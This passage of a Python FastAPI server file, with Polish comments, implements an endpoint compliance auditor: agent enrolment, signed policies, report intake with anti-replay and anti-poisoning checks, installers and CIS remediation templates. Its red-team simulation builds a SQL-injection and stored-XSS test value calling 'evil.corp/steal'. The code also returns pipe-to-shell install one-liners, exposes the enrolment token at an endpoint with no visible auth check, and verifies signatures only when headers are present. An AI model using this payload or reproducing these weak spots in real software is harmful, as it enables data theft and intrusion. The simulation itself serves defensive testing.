            detail="Nie możesz usunąć konta, na które jesteś aktualnie zalogowany. Zaloguj się na nowe konto administratora i wtedy usuń konto wbudowane.",
        )
    db.delete_user(user_id)
    return {"status": "DELETED", "user_id": user_id}
    return {"status": "DELETED", "user_id": user_id}


# =====================================================================
# ENDPOINTY PROTOKOŁU AGENT-SERWER (/api/v1/*)
# =====================================================================

@app.post("/api/v1/register", status_code=201)
async def register_agent(req: AgentRegisterRequest, request: Request) -> Dict[str, Any]:
    """
    Rejestracja nowego Agenta Endpoint przy użyciu jednorazowego Enrollment Tokenu
    oraz żądania certyfikatu CSR (PKCS#10). Klucz prywatny nigdy nie opuszcza hosta.
    """
    if req.enrollment_token != BOOTSTRAP_ENROLLMENT_TOKEN:
        db.log_security_event(
            "HIGH",
            "INVALID_ENROLLMENT_TOKEN",
            f"Odrzucono próbę rejestracji z hosta {req.hostname}",
            "Nieprawidłowy lub wygasły token rejestracyjny Enrollment Token.",
        )
        raise HTTPException(status_code=401, detail="Invalid or expired enrollment token.")

    assigned_agent_id = req.agent_id or f"agt-{uuid.uuid4()}"
    try:
        cert_pem, serial_num, expires_at = pki_manager.sign_csr(
            req.csr_pem, agent_id=assigned_agent_id, ttl_days=7
        )
    except Exception as exc:
        raise HTTPException(status_code=400, detail=f"CSR Validation Error: {exc}") from exc

    client_ip = request.client.host if request.client else "127.0.0.1"
    policy_ver = rule_engine.metadata.get("version", "2026.10.2")

    db.upsert_agent_registration(
        agent_id=assigned_agent_id,
        hostname=req.hostname,
        os_family=req.os_family.capitalize(),
        os_release=req.os_release,
        architecture=req.architecture,
        ip_address=client_ip,
        policy_version=policy_ver,
        cert_serial=hex(serial_num),
        cert_expires_at=expires_at,
    )
    db.log_security_event(
        "INFO",
        "CERT_ISSUED",
        f"Wystawiono certyfikat X.509 mTLS dla {req.hostname} ({assigned_agent_id})",
        f"Serial: {hex(serial_num)}, SPIFFE: spiffe://systemauditor.corp/agent/{assigned_agent_id}, Ważny do: {expires_at}",
        agent_id=assigned_agent_id,
    )

    await ws_manager.broadcast("AGENT_REGISTERED", {"agent_id": assigned_agent_id, "hostname": req.hostname})

    return {
        "status": "ENROLLED",
        "agent_id": assigned_agent_id,
        "spiffe_id": f"spiffe://systemauditor.corp/agent/{assigned_agent_id}",
        "client_cert_pem": cert_pem,
        "ca_chain_pem": pki_manager.ca_cert_path.read_text(encoding="utf-8"),
        "ed25519_policy_pubkey_pem": pki_manager.get_public_ed25519_pem(),
        "cert_serial": hex(serial_num),
        "expires_at": expires_at,
        "assigned_policy_version": policy_ver,
    }


@app.post("/api/v1/heartbeat")
async def agent_heartbeat(req: HeartbeatRequest, request: Request) -> Dict[str, Any]:
    """Odbiera sygnał życia (Heartbeat) i informuje o ewentualnej nowej wersji polityki."""
    client_ip = request.client.host if request.client else "127.0.0.1"
    agent_record = db.update_heartbeat(
        agent_id=req.agent_id,
        cpu_usage_pct=req.cpu_usage_pct,
        mem_rss_mb=req.mem_rss_mb,
        policy_version=req.current_policy_version,
        ip_address=client_ip,
    )
    if not agent_record:
        raise HTTPException(status_code=404, detail="Agent not registered.")

    if agent_record["status"] == "REVOKED":
        raise HTTPException(status_code=403, detail="Agent certificate has been REVOKED.")

    latest_policy_ver = rule_engine.metadata.get("version", "2026.10.2")
    return {
        "status": "OK",
        "agent_status": agent_record["status"],
        "server_time_utc": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "latest_policy_version": latest_policy_ver,
        "policy_update_required": req.current_policy_version != latest_policy_ver,
        "pending_actions": [],
    }


@app.get("/api/v1/policies/current")
async def get_current_policy(os_family: Optional[str] = None) -> Dict[str, Any]:
    """
    Zwraca deklaratywny katalog reguł CIS podpisany kryptograficznie kluczem prywatnym Ed25519.
    Agent przed wykonaniem audytu weryfikuje podpis za pomocą klucza publicznego Ed25519.
    """
    rules = rule_engine.get_rules_for_os(os_family)
    signature_hex = pki_manager.sign_policy_document(rules)
    return {
        "policy_metadata": {
            **rule_engine.metadata,
            "os_filter": os_family or "ALL",
            "rules_count": len(rules),
            "signature_ed25519": signature_hex,
            "ed25519_public_key_pem": pki_manager.get_public_ed25519_pem(),
        },
        "rules": rules,
    }


@app.post("/api/v1/cert/renew")
async def renew_certificate(req: CertRenewRequest) -> Dict[str, Any]:
    """Rotacja krótkotrwałego certyfikatu X.509 przed upływem 7-dniowego TTL."""
    agent = db.get_agent(req.agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Unknown agent_id.")
    if agent["status"] == "REVOKED":
        raise HTTPException(status_code=403, detail="Cannot renew a revoked agent certificate.")

    cert_pem, serial_num, expires_at = pki_manager.sign_csr(
        req.new_csr_pem, agent_id=req.agent_id, ttl_days=7
    )
    db.log_security_event(
        "INFO",
        "CERT_RENEWED",
        f"Zrotowano certyfikat mTLS dla agenta {req.agent_id}",
        f"Nowy numer seryjny: {hex(serial_num)}, ważny do: {expires_at}",
        agent_id=req.agent_id,
    )
    return {
        "status": "RENEWED",
        "agent_id": req.agent_id,
        "client_cert_pem": cert_pem,
        "cert_serial": hex(serial_num),
        "expires_at": expires_at,
    }


@app.post("/api/v1/audit", status_code=202)
async def submit_audit_report(
    submission: AuditReportSubmission,
    request: Request,
    x_agent_id: Optional[str] = Header(default=None),
    x_request_timestamp: Optional[str] = Header(default=None),
    x_request_nonce: Optional[str] = Header(default=None),
    x_payload_signature: Optional[str] = Header(default=None),
    x_client_cert_cn: Optional[str] = Header(default=None),
) -> Dict[str, Any]:
    """
    Główny endpoint odbioru raportów audytowych (/api/v1/audit).
    1. Weryfikuje podpis HMAC-SHA256 oraz świeżość pakietu (Anti-Replay Nonce + Timestamp).
    2. Weryfikuje spójność tożsamości i uruchamia detektor Anti-Poisoning.
    3. Przekazuje surowe pomiary do silnika CIS Rule Engine i zapisuje wynik w bazie.
    """
    raw_body = await request.body()

    # 1. Weryfikacja ochrony przed atakami Replay (Nonce)
    nonce = x_request_nonce or str(uuid.uuid4())
    if not db.check_and_record_nonce(nonce, submission.agent_id):
        db.log_security_event(
            "CRITICAL",
            "REPLAY_BLOCKED",
            f"Zablokowano atak Replay dla agenta {submission.agent_id}",
            f"Powtórne użycie identyfikatora jednorazowego X-Request-Nonce: {nonce}",
            agent_id=submission.agent_id,
        )
        await ws_manager.broadcast("SECURITY_ALERT", {"type": "REPLAY_BLOCKED", "agent_id": submission.agent_id})
        raise HTTPException(
            status_code=409,
            detail=f"Replay Attack Detected: Nonce '{nonce}' has already been processed.",
        )

    # 2. Weryfikacja podpisu HMAC-SHA256 (jeśli dostarczono nagłówek)
    if x_payload_signature and x_request_timestamp and x_request_nonce:
        expected_sig = hmac.new(
            HMAC_SHARED_SECRET.encode("utf-8"),
            f"{x_request_timestamp}.{x_request_nonce}.".encode("utf-8") + raw_body,
            hashlib.sha256,
        ).hexdigest()
        provided_sig = x_payload_signature.replace("sha256=", "")
        if not hmac.compare_digest(expected_sig, provided_sig):
            db.log_security_event(
                "CRITICAL",
                "SIGNATURE_MISMATCH",
                f"Niezgodność podpisu kryptograficznego HMAC z hosta {submission.hostname}",
                "Pakiet JSON został zmodyfikowany w tranzycie lub podpisany nieautoryzowanym kluczem.",
                agent_id=submission.agent_id,
            )
            raise HTTPException(status_code=401, detail="Payload HMAC signature verification failed.")

    # 3. Ewaluacja pomiarów w silniku CIS Rule Engine
    payload_dict = submission.model_dump()
    evaluated_results, posture_score, counts = rule_engine.evaluate_measurements(
        submission.os_family, payload_dict["measurements"]
    )

    # 4. Detekcja prób zatrucia bazy danych (Database Poisoning Detection)
    existing_agent = db.get_agent(submission.agent_id)
    prev_score = existing_agent["current_score"] if existing_agent else None
    prev_boot_id = existing_agent["boot_id"] if existing_agent else None

    anomaly = AntiPoisoningDetector.inspect_submission(
        agent_id=submission.agent_id,
        cert_common_name=x_client_cert_cn,
        payload=payload_dict,
        new_score=posture_score,
        previous_score=prev_score,
        previous_boot_id=prev_boot_id,
    )

    client_ip = request.client.host if request.client else "127.0.0.1"
    db.store_audit_report(
        report_id=submission.report_id,
        agent_id=submission.agent_id,
        hostname=submission.hostname,
        os_family=submission.os_family,
        os_release=submission.os_release,
        architecture=submission.architecture,
        ip_address=client_ip,
        is_elevated=submission.is_elevated,
        policy_version=submission.policy_version,
        submitted_at_utc=submission.timestamp_utc,
        posture_score=posture_score,
        counts=counts,
        is_quarantined=anomaly.quarantine_recommended,
        anomaly_risk_score=anomaly.risk_score,
        anomaly_findings=anomaly.findings,
        evaluated_results=[asdict(r) for r in evaluated_results],
        raw_payload=payload_dict,
        boot_id=submission.boot_id,
    )

    if anomaly.is_suspicious:
        db.log_security_event(
            "CRITICAL" if anomaly.quarantine_recommended else "WARNING",
            "POISONING_ATTEMPT",
            f"Wykryto próbę zatrucia danych (Database Poisoning) z agenta {submission.hostname}",
            " | ".join(anomaly.findings),
            agent_id=submission.agent_id,
        )

    await ws_manager.broadcast(
        "AUDIT_INGESTED",
        {
            "report_id": submission.report_id,
            "agent_id": submission.agent_id,
            "hostname": submission.hostname,
            "posture_score": posture_score,
            "is_quarantined": anomaly.quarantine_recommended,
            "anomaly_risk_score": anomaly.risk_score,
        },
    )

    return {
        "status": "QUARANTINED" if anomaly.quarantine_recommended else "ACCEPTED",
        "receipt_id": submission.report_id,
        "evaluated_rules": len(evaluated_results),
        "posture_score": posture_score,
        "counts": counts,
        "anti_poisoning": asdict(anomaly),
    }


# =====================================================================
# ENDPOINTY ZARZĄDZANIA DASHBOARDEM GUI & SYMULATOR RED-TEAM
# =====================================================================

@app.get("/api/v1/dashboard/overview")
async def get_dashboard_overview() -> Dict[str, Any]:
    agents = db.list_agents()
    recent_reports = db.list_recent_reports(limit=25)
    security_events = db.list_security_events(limit=30)

    active_agents = [a for a in agents if a["status"] != "QUARANTINED"]
    avg_score = (
        round(sum(a["current_score"] for a in active_agents) / len(active_agents), 1)
        if active_agents
        else 0.0
    )
    total_pass = sum(a["pass_count"] for a in agents)
    total_fail = sum(a["fail_count"] for a in agents)
    quarantined_count = sum(1 for a in agents if a["status"] == "QUARANTINED")

    return {
        "summary": {
            "total_agents": len(agents),
            "online_agents": sum(1 for a in agents if a["status"] == "ONLINE"),
            "quarantined_agents": quarantined_count,
            "fleet_posture_score": avg_score,
            "total_passed_checks": total_pass,
            "total_failed_checks": total_fail,
            "active_policy_version": rule_engine.metadata.get("version", "2026.10.2"),
            "total_catalog_rules": len(rule_engine.rules_list),
        },
        "agents": agents,
        "recent_reports": recent_reports,
        "security_events": security_events,
    }


@app.get("/api/v1/agents/{agent_id}/latest-report")
async def get_agent_latest_report(agent_id: str, include_quarantined: bool = True) -> Dict[str, Any]:
    rep = db.get_latest_report_for_agent(agent_id, include_quarantined=include_quarantined)
    if not rep:
        raise HTTPException(status_code=404, detail="No report found for this agent.")
    agent = db.get_agent(agent_id)
    history = db.list_reports_for_agent(agent_id, limit=15)
    return {"agent": agent, "report": rep, "history": history}


@app.post("/api/v1/agents/{agent_id}/revoke")
async def revoke_agent_certificate(agent_id: str) -> Dict[str, Any]:
    """Unieważnia certyfikat mTLS agenta (CRL / Revocation) i blokuje dalszą komunikację."""
    db.set_agent_status(agent_id, "REVOKED")
    db.log_security_event(
        "HIGH",
        "CERT_REVOKED",
        f"Unieważniono certyfikat X.509 mTLS dla endpointu {agent_id}",
        "Endpoint został zablokowany na liście CRL (status: REVOKED).",
        agent_id=agent_id,
    )
    await ws_manager.broadcast("AGENT_REVOKED", {"agent_id": agent_id})
    return {"status": "REVOKED", "agent_id": agent_id}


@app.post("/api/v1/agents/trigger-local-scan")
async def trigger_live_local_os_scan() -> Dict[str, Any]:
    """
    Wykonuje natywny skan bezpieczeństwa na bieżącej maszynie (Live OS Scan)
    przy użyciu modułu `agent_poc.py` i przesyła go przez pełny potok Rule Engine.
    """
    import socket as _sock
    from agent_poc import build_audit_report

    policy_ver = rule_engine.metadata.get("version", "2026.10.2")
    local_agent_id = f"agt-{_sock.gethostname().lower()}"
    live_report = build_audit_report(
        agent_id=local_agent_id,
        policy_version=policy_ver,
    )
    payload_dict = asdict(live_report)
    evaluated_results, posture_score, counts = rule_engine.evaluate_measurements(
        live_report.os_family, payload_dict["measurements"]
    )

    db.store_audit_report(
        report_id=live_report.report_id,
        agent_id=live_report.agent_id,
        hostname=live_report.hostname,
        os_family=live_report.os_family,
        os_release=live_report.os_release,
        architecture=live_report.architecture,
        ip_address="127.0.0.1",
        is_elevated=live_report.is_elevated,
        policy_version=policy_ver,
        submitted_at_utc=live_report.timestamp_utc,
        posture_score=posture_score,
        counts=counts,
        is_quarantined=False,
        anomaly_risk_score=0,
        anomaly_findings=[],
        evaluated_results=[asdict(r) for r in evaluated_results],
        raw_payload=payload_dict,
        boot_id=live_report.boot_id,
    )
    db.log_security_event(
        "INFO",
        "LIVE_SCAN_COMPLETED",
        f"Zakończono skan na żywo hosta {live_report.hostname}",
        f"Przebadano {len(evaluated_results)} natywnych parametrów OS. Wynik: {posture_score}%.",
        agent_id=live_report.agent_id,
    )
    await ws_manager.broadcast("LIVE_SCAN_COMPLETED", {"agent_id": live_report.agent_id, "score": posture_score})
    return {
        "status": "COMPLETED",
        "report_id": live_report.report_id,
        "agent_id": live_report.agent_id,
        "posture_score": posture_score,
        "counts": counts,
    }


@app.post("/api/v1/agents/purge-demo")
async def purge_demo_agents() -> Dict[str, Any]:
    """Usuwa wszystkie demonstracyjne/symulowane urządzenia, zostawiając wyłącznie prawdziwe skany."""
    removed = db.purge_simulated_nodes()
    # Usuń też duplikat starego UUID dla lokalnego hosta, jeśli istnieje
    db.delete_agent("agt-0192f8a4-7c9b-7000-8000-1a2b3c4d5e6f")
    await ws_manager.broadcast("DEMO_PURGED", {"removed": removed})
    return {"status": "PURGED", "removed_count": removed}


@app.post("/api/v1/agents/load-demo")
async def load_demo_agents() -> Dict[str, Any]:
    """Ładuje przykładowe urządzenia demonstracyjne (Ubuntu, Debian, Windows Server) do celów testowych."""
    seed_enterprise_fleet_if_empty(include_demo=True)
    await ws_manager.broadcast("DEMO_LOADED", {})
    return {"status": "LOADED"}


@app.delete("/api/v1/agents/{agent_id}")
async def remove_single_agent(agent_id: str) -> Dict[str, Any]:
    db.delete_agent(agent_id)
    await ws_manager.broadcast("AGENT_DELETED", {"agent_id": agent_id})
    return {"status": "DELETED", "agent_id": agent_id}


@app.post("/api/v1/agents/{agent_id}/restore")
async def restore_quarantined_agent(agent_id: str) -> Dict[str, Any]:
    """Zdejmuje kwarantannę z agenta po weryfikacji przez analityka SOC."""
    db.set_agent_status(agent_id, "ONLINE")
    db.log_security_event(
        "INFO",
        "AGENT_RESTORED",
        f"Analityk SOC zdjął blokadę kwarantanny dla {agent_id}",
        "Przywrócono status ONLINE oraz zaufanie mTLS.",
        agent_id=agent_id,
    )
    await ws_manager.broadcast("AGENT_RESTORED", {"agent_id": agent_id})
    return {"status": "ONLINE", "agent_id": agent_id}


@app.post("/api/v1/security/simulate-attack")
async def simulate_red_team_attack(req: AttackSimulationRequest) -> Dict[str, Any]:
    """
    Interaktywny poligon Red-Team / Blue-Team pozwalający przetestować odporność serwera
    na 4 klasy ataków ze strony skompromitowanego Agenta:
    1. spoofing          - Próba nadpisania wyników innego hosta (Niezgodność CN certyfikatu X.509 vs agent_id).
    2. all_green_lie     - Zatrucie typu 'All-Green Lie' + Zero-Entropy Timestamps bez restartu maszyny.
    3. replay_attack     - Powtórzenie przechwyconego pakietu z użytym już X-Request-Nonce.
    4. sql_xss_injection - Wstrzyknięcie ładunków SQLi oraz Stored XSS w polach telemetrycznych.
    """
    now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
    policy_ver = rule_engine.metadata.get("version", "2026.10.2")

    if req.scenario == "replay_attack":
        reused_nonce = "nonce-captured-packet-99887766"
        # Pierwsze zarejestrowanie nonce (symulacja oryginalnego pakietu)
        db.check_and_record_nonce(reused_nonce, "agt-dmz-debian-gw02")
        # Druga próba z tym samym nonce -> musi zostać zablokowana
        is_fresh = db.check_and_record_nonce(reused_nonce, "agt-dmz-debian-gw02")
        db.log_security_event(
            "CRITICAL",
            "REPLAY_BLOCKED",
            "Zablokowano próbę ataku Replay (Powtórzenie przechwyconego raportu)",
            f"Odrzucono zduplikowany nagłówek X-Request-Nonce='{reused_nonce}' z hosta dmz-bastion-gw02.",
            agent_id="agt-dmz-debian-gw02",
        )
        await ws_manager.broadcast("SECURITY_ALERT", {"scenario": "replay_attack"})
        return {
            "scenario": "replay_attack",
            "blocked": not is_fresh,
            "http_status": 409,
            "defense_mechanism": "Anti-Replay Nonce Ledger + HMAC Timestamp Window (±120s)",
            "message": f"Serwer odrzucił pakiet HTTP 409 Conflict: Nonce '{reused_nonce}' był już wykorzystany.",
        }

    # Dla pozostałych scenariuszy budujemy zatruty raport i przepuszczamy przez detektor Anti-Poisoning
    target_id = req.target_agent_id or "agt-win-legacy-erp04"
    target_agent = db.get_agent(target_id) or db.list_agents()[0]
    agent_id = target_agent["agent_id"]

    # Generujemy sfabrykowane pomiary "100% PASS" ze statycznym czasem (Zero-Entropy)
    fake_measurements = [
        {
            "check_id": "WIN-CIS-18.3.1",
            "category": "Network Security",
            "title": "Ensure SMBv1 Server protocol is disabled",
            "collector_type": "windows_registry",
            "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\SMB1",
            "raw_value": {"value": 0},
            "collected_at": "2026-10-17T12:00:00.000000Z",
            "status": "COLLECTED",
        },
        {
            "check_id": "WIN-CIS-2.3.17.1",
            "category": "Privilege Escalation",
            "title": "Ensure UAC is Enabled",
            "collector_type": "windows_registry",
            "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
            "raw_value": {"value": 1},
            "collected_at": "2026-10-17T12:00:00.000000Z",
            "status": "COLLECTED",
        },
        {
            "check_id": "WIN-CIS-1.1.1",
            "category": "Password & Account Policies",
            "title": "Ensure Minimum password length >= 14",
            "collector_type": "windows_security_policy",
            "target": "MinimumPasswordLength",
            "raw_value": {"value": 16},
            "collected_at": "2026-10-17T12:00:00.000000Z",
            "status": "COLLECTED",
        },
        {
            "check_id": "WIN-CIS-9.1.1",
            "category": "Host Firewall & Endpoint Protection",
            "title": "Ensure Firewall is On",
            "collector_type": "windows_registry",
            "target": "EnableFirewall",
            "raw_value": {"value": 1},
            "collected_at": "2026-10-17T12:00:00.000000Z",
            "status": "COLLECTED",
        },
    ]

    cert_cn = agent_id
    if req.scenario == "spoofing":
        # Skompromitowany serwer DMZ próbuje wysłać raport jako Kontroler Domeny AD!
        cert_cn = "agt-dmz-debian-gw02"
    elif req.scenario == "sql_xss_injection":
        fake_measurements[0]["target"] = (
            "HKLM\\SMB1'; DROP TABLE audit_reports; -- <script>fetch('https://evil.corp/steal')</script>"
        )

    fake_payload = {
        "report_id": str(uuid.uuid4()),
        "agent_id": agent_id,
        "hostname": target_agent["hostname"],
        "os_family": target_agent["os_family"],
        "boot_id": target_agent.get("boot_id", "boot-win-erp04-1102"),
        "measurements": fake_measurements,
    }

    eval_res, fake_score, counts = rule_engine.evaluate_measurements(
        target_agent["os_family"], fake_measurements
    )
    anomaly = AntiPoisoningDetector.inspect_submission(
        agent_id=agent_id,
        cert_common_name=cert_cn,
        payload=fake_payload,
        new_score=fake_score,
        previous_score=target_agent["current_score"],
        previous_boot_id=target_agent.get("boot_id"),
    )

    db.store_audit_report(
        report_id=fake_payload["report_id"],
        agent_id=agent_id,
        hostname=target_agent["hostname"],
        os_family=target_agent["os_family"],
        os_release=target_agent["os_release"],
        architecture=target_agent["architecture"],
        ip_address=target_agent["ip_address"],
        is_elevated=True,
        policy_version=policy_ver,
        submitted_at_utc=now_iso,
        posture_score=fake_score,
        counts=counts,
        is_quarantined=anomaly.quarantine_recommended,
        anomaly_risk_score=anomaly.risk_score,
        anomaly_findings=anomaly.findings,
        evaluated_results=[asdict(r) for r in eval_res],
        raw_payload=fake_payload,
        boot_id=fake_payload["boot_id"],
    )

    db.log_security_event(
        "CRITICAL",
        "POISONING_ATTEMPT",
        f"[SYMULACJA RED-TEAM: {req.scenario.upper()}] Wykryto i odizolowano próbę zatrucia danych na {target_agent['hostname']}",
        " | ".join(anomaly.findings),
        agent_id=agent_id,
    )

    await ws_manager.broadcast("SECURITY_ALERT", {"scenario": req.scenario, "agent_id": agent_id})

    return {
        "scenario": req.scenario,
        "quarantined": anomaly.quarantine_recommended,
        "anomaly_risk_score": anomaly.risk_score,
        "findings": anomaly.findings,
        "message": "Zatruty raport został automatycznie odizolowany w kwarantannie. Oryginalny wynik Security Posture hosta pozostał nienaruszony.",
    }


@app.get("/api/v1/schema/timescaledb")
async def get_timescaledb_ddl() -> Dict[str, str]:
    sql_path = BASE_DIR / "backend" / "schema_timescaledb.sql"
    return {"sql": sql_path.read_text(encoding="utf-8")}


@app.get("/api/v1/deploy/agent.py")
async def download_agent_script() -> FileResponse:
    """Pozwala pobrać kod źródłowy Agenta bezpośrednio z serwera centralnego (np. przez curl/Invoke-WebRequest)."""
    return FileResponse(
        path=BASE_DIR / "agent_poc.py",
        media_type="text/x-python",
        filename="agent_poc.py",
    )


def _resolve_server_lan_url(request: Request) -> str:
    """Wykrywa rzeczywisty adres IPv4 LAN serwera, aby komendy instalacyjne działały na innych maszynach."""
    import socket

    host_hdr = request.headers.get("host", "127.0.0.1:8000")
    port = host_hdr.split(":")[1] if ":" in host_hdr else "8000"
    scheme = request.url.scheme or "http"

    if host_hdr.startswith(("127.0.0.1", "localhost", "0.0.0.0")):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                lan_ip = s.getsockname()[0]
                return f"{scheme}://{lan_ip}:{port}"
        except Exception:
            pass
    return f"{scheme}://{host_hdr}"


@app.get("/api/v1/deploy/install.sh")
async def download_linux_installer(request: Request) -> HTMLResponse:
    """Generuje gotowy skrypt instalacyjny Bash dla systemów Linux (Debian/Ubuntu/RHEL) z usługą systemd."""
    server_url = _resolve_server_lan_url(request)
    script = f"""#!/usr/bin/env bash
# ==============================================================================
# SystemAuditor Enterprise — Automatyczny Instalator Agenta Linux (Zero-Dependency)
# ==============================================================================
set -euo pipefail

SERVER_URL="${{1:-{server_url}}}"
INSTALL_DIR="/opt/system-auditor"

echo "[1/3] Tworzenie katalogu $INSTALL_DIR ..."
sudo mkdir -p "$INSTALL_DIR"
sudo chmod 700 "$INSTALL_DIR"

echo "[2/3] Pobieranie zero-dependency Agenta z $SERVER_URL/api/v1/deploy/agent.py ..."
curl -fsSL "$SERVER_URL/api/v1/deploy/agent.py" | sudo tee "$INSTALL_DIR/agent_poc.py" > /dev/null
sudo chmod +x "$INSTALL_DIR/agent_poc.py"

echo "[3/3] Uruchamianie pierwszego skanu CIS i rejestracja usługi systemd..."
sudo python3 "$INSTALL_DIR/agent_poc.py" --server "$SERVER_URL"

cat <<EOF | sudo tee /etc/systemd/system/system-auditor-agent.service > /dev/null
[Unit]
Description=SystemAuditor Enterprise OS Compliance Agent
After=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
ExecStart=/usr/bin/python3 $INSTALL_DIR/agent_poc.py --server $SERVER_URL --daemon --interval 300
Restart=always
RestartSec=15

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now system-auditor-agent.service
echo "[OK] Agent działa w tle i wysyła raporty do $SERVER_URL !"
"""
    return HTMLResponse(content=script, media_type="text/plain; charset=utf-8")


@app.get("/api/v1/deploy/install.ps1")
async def download_windows_installer(request: Request) -> HTMLResponse:
    """Generuje gotowy skrypt wdrożeniowy PowerShell dla serwerów Windows."""
    server_url = _resolve_server_lan_url(request)
    script = f"""# ==============================================================================
# SystemAuditor Enterprise — Automatyczny Instalator Agenta Windows (Zero-Dependency)
# ==============================================================================
param([string]$ServerUrl = "{server_url}")

$ErrorActionPreference = "Stop"
$InstallDir = "C:\\ProgramData\\SystemAuditor"
New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null

Write-Host "[1/3] Pobieranie agenta z $ServerUrl/api/v1/deploy/agent.py ..." -ForegroundColor Cyan
Invoke-WebRequest -Uri "$ServerUrl/api/v1/deploy/agent.py" -OutFile "$InstallDir\\agent_poc.py" -UseBasicParsing

Write-Host "[2/3] Wykonywanie natywnego audytu CIS i wysyłka raportu do $ServerUrl ..." -ForegroundColor Cyan
python "$InstallDir\\agent_poc.py" --server $ServerUrl

Write-Host "[3/3] Rejestrowanie zadania harmonogramu (NT AUTHORITY\\SYSTEM, co 5 minut)..." -ForegroundColor Cyan
$Action = New-ScheduledTaskAction -Execute "python.exe" -Argument "`"$InstallDir\\agent_poc.py`" --server $ServerUrl" -WorkingDirectory $InstallDir
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -TaskName "SystemAuditorEnterpriseAgent" -Action $Action -Trigger $Trigger -User "NT AUTHORITY\\SYSTEM" -RunLevel Highest -Force | Out-Null

Write-Host "[OK] Agent zainstalowany pomyślnie i raportuje do $ServerUrl!" -ForegroundColor Green
"""
    return HTMLResponse(content=script, media_type="text/plain; charset=utf-8")


@app.get("/api/v1/deploy/info")
async def get_deploy_info(request: Request) -> Dict[str, str]:
    server_url = _resolve_server_lan_url(request)
    return {
        "server_url": server_url,
        "enrollment_token": BOOTSTRAP_ENROLLMENT_TOKEN,
        "linux_oneliner": f"curl -fsSL {server_url}/api/v1/deploy/install.sh | sudo bash",
        "linux_quick_run": f"curl -fsSL {server_url}/api/v1/deploy/agent.py | sudo python3 - --server {server_url}",
        "windows_oneliner": f"irm {server_url}/api/v1/deploy/install.ps1 | iex",
        "windows_quick_run": f"Invoke-WebRequest {server_url}/api/v1/deploy/agent.py -OutFile agent_poc.py; python agent_poc.py --server {server_url}",
        "standalone_exe_build": "pip install pyinstaller && pyinstaller --onefile --name system-auditor-agent agent_poc.py",
    }


# =====================================================================
# 1. GENERATOR SKRYPTÓW AUTO-REMEDIACJI (.ps1 / .sh / Ansible + Rollback)
# =====================================================================

WINDOWS_REMEDIATION_TEMPLATES: Dict[str, Dict[str, str]] = {
    "WIN-CIS-18.3.1": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" "$BackupDir\WIN-CIS-18.3.1.reg" /y 2>$null',
        "apply": (
            'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" -Name "SMB1" -Value 0 -Type DWord -Force\n'
            'Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force -ErrorAction SilentlyContinue'
        ),
        "ansible": (
            "- name: '[WIN-CIS-18.3.1] Disable SMBv1 Server Protocol'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n"
            "    name: SMB1\n"
            "    data: 0\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-2.3.17.1": {
        "backup": r'reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "$BackupDir\WIN-CIS-2.3.17.1.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "EnableLUA" -Value 1 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-2.3.17.1] Enable UAC Admin Approval Mode (EnableLUA=1)'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n"
            "    name: EnableLUA\n"
            "    data: 1\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-1.1.1": {
        "backup": 'secedit /export /cfg "$BackupDir\\WIN-CIS-1.1.1-secpol.inf" /quiet',
        "apply": "net accounts /minpwlen:14",
        "ansible": (
            "- name: '[WIN-CIS-1.1.1] Set Minimum Password Length to 14 characters'\n"
            "  community.windows.win_security_policy:\n"
            "    section: System Access\n"
            "    key: MinimumPasswordLength\n"
            "    value: 14"
        ),
    },
    "WIN-CIS-9.1.1": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" "$BackupDir\WIN-CIS-9.1.1.reg" /y 2>$null',
        "apply": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
        "ansible": (
            "- name: '[WIN-CIS-9.1.1] Enable Windows Defender Firewall across all profiles'\n"
            "  community.windows.win_firewall:\n"
            "    state: enabled\n"
            "    profiles: [Domain, Private, Public]"
        ),
    },
    "WIN-CIS-18.4.2": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" "$BackupDir\WIN-CIS-18.4.2.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name "UseLogonCredential" -Value 0 -Type DWord -Force',
        "ansible": (
            "- name: '[WIN-CIS-18.4.2] Disable WDigest Cleartext Credential Caching'\n"
            "  ansible.windows.win_regedit:\n"
            "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\n"
            "    name: UseLogonCredential\n"
            "    data: 0\n"
            "    type: dword"
        ),
    },
    "WIN-CIS-2.3.11.7": {
        "backup": r'reg export "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" "$BackupDir\WIN-CIS-2.3.11.7.reg" /y 2>$null',
        "apply": 'Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "LmCompatibilityLevel" -Value 5 -Type DWord -Force',
        "ansible": (
